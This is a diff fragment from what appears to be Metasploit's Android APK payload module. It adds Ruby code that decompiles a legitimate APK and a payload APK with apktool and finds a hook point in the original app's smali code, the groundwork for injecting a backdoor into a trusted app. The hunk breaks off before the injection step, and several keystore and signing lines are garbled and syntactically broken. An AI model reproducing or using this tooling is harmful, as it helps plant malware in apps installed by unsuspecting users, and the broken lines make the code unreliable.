@@ -142,3 +142,34 @@ class MSF::Payload::Apk
           usage
           raise RuntimeError, "Invalid template: #{apkfile}"
       end
+      
+      #Create temporary directory where work will be done
+      tempdir = Dir.mktmpdir
+      
+      #keystore = "#{tempdir}/signing.keystore"torepass = "android"keypass = "androidkeyalias = "signing.key"orig_cert_data = parse_orig_cert_data(apkfile)orig_cert_dname = orig_cert_data[0]orig_cert_startdate = orig_cert_data[orig_cert_validity = orig_cert_data[2]
+      
+      print_status "Creating signing key and keystore..\n"
+      #run_cmd("keytool -genkey -v -keystore{keystore} \alias #{keyalias} -storepass #{storepass} -keypass #{keypass} -keyalg RSA \-keysize 2048 -startdate '#{orig_cert_startdate}' \mm-validity #{orig_cert_validity} -dname#{orig_cert_dname}'")
+      
+      File.open("#{tempdir}/payload.apk", "wb") {|file| file.puts raw_payload }
+      FileUtils.cp apkfile, "#{tempdir}/original.apk"
+      
+      print_status "Decompiling original APK..\n"
+      run_cmd("apktool d -f -r --force-manifest #{tempdir}/original.apk -o #{tempdir}/original")
+      print_status "Decompiling payload APK..\n"
+      run_cmd("apktool d -f -r --force-manifest #{tempdir}/payload.apk -o #{tempdir}/payload")
+      
+      amanifest = parse_manifest("#{tempdir}/original/AndroidManifest.xml")
+      
+      print_status "Locating hook point..\n"
+      hookable_class = find_hook_point(amanifest)
+      smalifile = "#{tempdir}/original/smali*/" + hookable_class.gsub(/\./, "/") + ".smali"
+      smalifiles = Dir.glob(smalifile)
+      for smalifile in smalifiles
+          if File.readable?(smalifile)
+              hooksmali = File.read(smalifile)
+              break
+          end
+      end
+            
+            
